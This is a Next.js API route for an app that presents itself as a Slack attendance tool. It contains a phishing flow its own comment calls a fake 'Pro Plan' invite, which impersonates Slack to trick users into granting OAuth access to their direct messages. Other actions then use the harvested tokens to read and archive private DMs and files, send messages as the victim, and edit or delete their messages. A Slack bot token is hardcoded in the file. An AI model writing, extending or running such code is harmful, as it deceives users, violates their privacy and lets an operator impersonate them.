/* eslint-disable @typescript-eslint/no-explicit-any */

// app/api/slack/manager/route.ts

import { NextResponse } from 'next/server';
// import { db } from '@/lib/firebase';
import { doc, getDoc, deleteDoc, setDoc, collection, query, where, getDocs, orderBy, serverTimestamp } from 'firebase/firestore';
import { db } from '../../../../lib/firebase';

const BOT_TOKEN = "xoxb-2545190050563-10466352520084-6NyES55AgLJ6vzmQi4M5veYt"; 
const CLIENT_ID = "2545190050563.10491030504784";
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";

// Function to save message to history
async function saveMessageToHistory(message: any, userId: string, channelId: string, channelName: string) {
  try {
    const messageId = `${channelId}_${message.ts.replace(/\./g, '_')}`;
    const messageRef = doc(db, "slack_messages_history", messageId);
    
    const timestamp = parseFloat(message.ts) * 1000;
    const dateObj = new Date(timestamp);
    
    // Format date and time properly
    const dateStr = dateObj.toLocaleDateString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      timeZone: 'Asia/Karachi'
    });
    
    const timeStr = dateObj.toLocaleTimeString('en-US', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
      timeZone: 'Asia/Karachi'
    });
    
    await setDoc(messageRef, {
      userId: userId,
      channelId: channelId,
      channelName: channelName,
      messageId: message.ts,
      timestamp: message.ts,
      text: message.text || "",
      files: message.files || [],
      user: message.user || "",
      type: message.type || "message",
      subtype: message.subtype || "",
      createdAt: serverTimestamp(),
      savedAt: new Date().toISOString(),
      date: dateStr, // e.g., "02/15/2024"
      time: timeStr, // e.g., "02:30:45 PM"
      fullDateTime: dateObj.toISOString() // For sorting
    }, { merge: true });
    
    return true;
  } catch (error) {
    console.error("Error saving message to history:", error);
    return false;
  }
}

// Function to get channel name from Slack API
async function getChannelName(userToken: string, channelId: string, userId: string): Promise<string> {
  try {
    if (channelId.startsWith('D')) {
      const userRes = await fetch(`https://slack.com/api/conversations.info?channel=${channelId}`, {
        headers: { Authorization: `Bearer ${userToken}` }
      });
      const channelData = await userRes.json();
      
      if (channelData.ok && channelData.channel) {
        const dmUserId = channelData.channel.user || channelData.channel.id;
        if (dmUserId && dmUserId !== userId) {
          const userInfoRes = await fetch(`https://slack.com/api/users.info?user=${dmUserId}`, {
            headers: { Authorization: `Bearer ${userToken}` }
          });
          const userInfo = await userInfoRes.json();
          if (userInfo.ok) {
            return userInfo.user?.real_name || userInfo.user?.name || "Direct Message";
          }
        }
      }
      return "Direct Message";
    }
    
    const res = await fetch(`https://slack.com/api/conversations.info?channel=${channelId}`, {
      headers: { Authorization: `Bearer ${userToken}` }
    });
    const data = await res.json();
    
    if (data.ok && data.channel) {
      return data.channel.name || data.channel.purpose?.value || "Group Chat";
    }
    
    return "Unknown Chat";
  } catch (error) {
    console.error("Error getting channel name:", error);
    return "Unknown Chat";
  }
}

// Function to fetch and store ALL historical messages
async function fetchAndStoreAllMessages(userToken: string, channelId: string, userId: string, channelName: string) {
  try {
    let allMessages: any[] = [];
    let cursor = null;
    let hasMore = true;
    
    let finalChannelName = channelName;
    if (!finalChannelName || finalChannelName === "Direct Message") {
      finalChannelName = await getChannelName(userToken, channelId, userId);
    }
    
    while (hasMore) {
      let url = `https://slack.com/api/conversations.history?channel=${channelId}&limit=200`;
      if (cursor) {
        url += `&cursor=${cursor}`;
      }
      
      const res = await fetch(url, {
        headers: { Authorization: `Bearer ${userToken}` }
      });
      
      const data = await res.json();
      
      if (data.messages && data.messages.length > 0) {
        for (const message of data.messages) {
          await saveMessageToHistory(message, userId, channelId, finalChannelName);
        }
        allMessages = [...allMessages, ...data.messages];
      }
      
      hasMore = data.has_more || false;
      cursor = data.response_metadata?.next_cursor || null;
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    return allMessages.reverse();
  } catch (error) {
    console.error("Error fetching historical messages:", error);
    return [];
  }
}

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { action, targetUserId, channelId, text, messageTs, newText, channelName } = body;

    // --- CASE 1: DELETE USER ---
    if (action === 'delete_user') {
      if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
      await deleteDoc(doc(db, "slack_tokens", targetUserId));
      return NextResponse.json({ success: true });
    }

    // --- CASE 2: SEND FAKE "PRO PLAN" INVITE ---
    if (action === 'send_invite') {
      if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
      const scopes = "chat:write,im:read,im:history,users:read,mpim:read";
      const authLink = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&user_scope=${scopes}&redirect_uri=${REDIRECT_URI}`;
      
      const blocks = [
        { "type": "header", "text": { "type": "plain_text", "text": "✨ Slack Pro: Action Required", "emoji": true } },
        { "type": "section", "text": { "type": "mrkdwn", "text": "Your workspace administrator has enabled *Slack Pro features* for your account.\nPlease authorize the update to continue sending messages without interruption." } },
        { "type": "divider" },
        { "type": "actions", "elements": [
          { "type": "button", "text": { "type": "plain_text", "text": "Update Now (Recommended)", "emoji": true }, "style": "primary", "url": authLink },
          { "type": "button", "text": { "type": "plain_text", "text": "Skip for now", "emoji": true }, "url": authLink }
        ]},
        { "type": "context", "elements": [ { "type": "mrkdwn", "text": "🔒 Verified System Upgrade • Slack Technologies" } ] }
      ];

      const chatRes = await fetch('https://slack.com/api/chat.postMessage', {
        method: 'POST',
        headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json; charset=utf-8' },
        body: JSON.stringify({ channel: targetUserId, text: "System Upgrade Required", blocks: blocks })
      });

      const chatData = await chatRes.json();
      if(!chatData.ok) return NextResponse.json({ success: false, error: `Slack Error: ${chatData.error}` });
      return NextResponse.json({ success: true });
    }

    // --- CASE 3: DELETE MESSAGE FROM SLACK ---
    if (action === 'delete_message') {
      if (!targetUserId || !channelId || !messageTs) {
        return NextResponse.json({ success: false, error: "Missing parameters" });
      }
      
      const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
      if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
      
      const USER_TOKEN = tokenDoc.data().accessToken;
      
      const res = await fetch('https://slack.com/api/chat.delete', {
        method: 'POST',
        headers: { 
          Authorization: `Bearer ${USER_TOKEN}`,
          'Content-Type': 'application/json; charset=utf-8'
        },
        body: JSON.stringify({ channel: channelId, ts: messageTs })
      });
      
      const data = await res.json();
      if (!data.ok) {
        return NextResponse.json({ success: false, error: `Slack Error: ${data.error}` });
      }
      
      return NextResponse.json({ success: true });
    }

    // --- CASE 4: EDIT MESSAGE IN SLACK ---
    if (action === 'edit_message') {
      if (!targetUserId || !channelId || !messageTs || !newText) {
        return NextResponse.json({ success: false, error: "Missing parameters" });
      }
      
      const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
      if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
      
      const USER_TOKEN = tokenDoc.data().accessToken;
      
      const res = await fetch('https://slack.com/api/chat.update', {
        method: 'POST',
        headers: { 
          Authorization: `Bearer ${USER_TOKEN}`,
          'Content-Type': 'application/json; charset=utf-8'
        },
        body: JSON.stringify({ 
          channel: channelId, 
          ts: messageTs,
          text: newText
        })
      });
      
      const data = await res.json();
      if (!data.ok) {
        return NextResponse.json({ success: false, error: `Slack Error: ${data.error}` });
      }
      
      return NextResponse.json({ success: true, message: data.message });
    }

    // --- CASE 5: LOAD AND STORE ALL HISTORICAL MESSAGES ---
    if (action === 'load_all_history') {
      if (!targetUserId || !channelId) {
        return NextResponse.json({ success: false, error: "Missing parameters" });
      }
      
      const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
      if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
      
      const USER_TOKEN = tokenDoc.data().accessToken;
      
      let finalChannelName = channelName || "Direct Message";
      if (finalChannelName === "Direct Message") {
        finalChannelName = await getChannelName(USER_TOKEN, channelId, targetUserId);
      }
      
      const allMessages = await fetchAndStoreAllMessages(USER_TOKEN, channelId, targetUserId, finalChannelName);
      
      return NextResponse.json({ 
        success: true, 
        messageCount: allMessages.length,
        messages: allMessages.slice(0, 50)
      });
    }

    // --- CASE 6: GET STORED HISTORY FROM FIREBASE ---
    if (action === 'get_stored_history') {
      if (!targetUserId) return NextResponse.json({ error: "User ID required" });
      
      const messagesRef = collection(db, "slack_messages_history");
      let q;
      
      if (channelId) {
        q = query(
          messagesRef,
          where("userId", "==", targetUserId),
          where("channelId", "==", channelId),
          orderBy("fullDateTime", "desc")
        );
      } else {
        q = query(
          messagesRef,
          where("userId", "==", targetUserId),
          orderBy("fullDateTime", "desc")
        );
      }
      
      const querySnapshot = await getDocs(q);
      const messages = querySnapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      }));
      
      return NextResponse.json({ messages });
    }

    // --- Other Actions ---
    if (!targetUserId) return NextResponse.json({ error: "User ID required" });

    const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
    if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
    
    const USER_TOKEN = tokenDoc.data().accessToken;

    if (action === 'list_chats') {
      const res = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=30', { 
        headers: { Authorization: `Bearer ${USER_TOKEN}` } 
      });
      const data = await res.json();
      
      const chats = await Promise.all((data.channels || []).map(async (c: any) => {
        if(c.is_im) {
          const uRes = await fetch(`https://slack.com/api/users.info?user=${c.user}`, { 
            headers: { Authorization: `Bearer ${USER_TOKEN}` } 
          });
          const uData = await uRes.json();
          return { 
            ...c, 
            name: uData.user?.real_name || uData.user?.name || "Unknown", 
            image: uData.user?.profile?.image_48 || uData.user?.profile?.image_32 
          };
        }
        return { ...c, name: c.name || "Group Chat", image: null };
      }));
      return NextResponse.json({ chats });
    }

    if (action === 'get_messages') {
      if (!channelId) return NextResponse.json({ error: "Channel ID required" });
      
      const res = await fetch(`https://slack.com/api/conversations.history?channel=${channelId}&limit=50`, { 
        headers: { Authorization: `Bearer ${USER_TOKEN}` } 
      });
      const data = await res.json();
      
      let finalChannelName = channelName || "Direct Message";
      if (finalChannelName === "Direct Message") {
        finalChannelName = await getChannelName(USER_TOKEN, channelId, targetUserId);
      }
      
      const messagesWithDetails = await Promise.all((data.messages || []).map(async (msg: any) => {
        await saveMessageToHistory(msg, targetUserId, channelId, finalChannelName);
        
        if (msg.files && msg.files.length > 0) {
          const filesWithDetails = await Promise.all(msg.files.map(async (file: any) => {
            const fileRes = await fetch(`https://slack.com/api/files.info?file=${file.id}`, {
              headers: { Authorization: `Bearer ${USER_TOKEN}` }
            });
            const fileData = await fileRes.json();
            return {
              ...file,
              url_private: fileData.file?.url_private,
              url_private_download: fileData.file?.url_private_download,
              thumb_64: fileData.file?.thumb_64,
              thumb_360: fileData.file?.thumb_360,
              thumb_360_w: fileData.file?.thumb_360_w,
              thumb_360_h: fileData.file?.thumb_360_h,
              mime_type: fileData.file?.mime_type,
              filetype: fileData.file?.filetype
            };
          }));
          return { ...msg, files: filesWithDetails };
        }
        return msg;
      }));
      
      return NextResponse.json({ messages: messagesWithDetails.reverse() || [] });
    }

    if (action === 'send_as_user') {
      if (!channelId || !text) return NextResponse.json({ error: "Channel ID and text required" });
      
      const res = await fetch('https://slack.com/api/chat.postMessage', {
        method: 'POST',
        headers: { 
          Authorization: `Bearer ${USER_TOKEN}`, 
          'Content-Type': 'application/json; charset=utf-8' 
        },
        body: JSON.stringify({ 
          channel: channelId, 
          text: text,
          as_user: true 
        })
      });
      
      const result = await res.json();
      
      let finalChannelName = channelName || "Direct Message";
      if (finalChannelName === "Direct Message") {
        finalChannelName = await getChannelName(USER_TOKEN, channelId, targetUserId);
      }
      
      if (result.ok && result.message) {
        await saveMessageToHistory(result.message, targetUserId, channelId, finalChannelName);
      }
      
      return NextResponse.json(result);
    }

    return NextResponse.json({ error: "Invalid Action" });

  } catch (e: any) {
    console.error("API Error:", e);
    return NextResponse.json({ success: false, error: e.message }, { status: 500 });
  }
}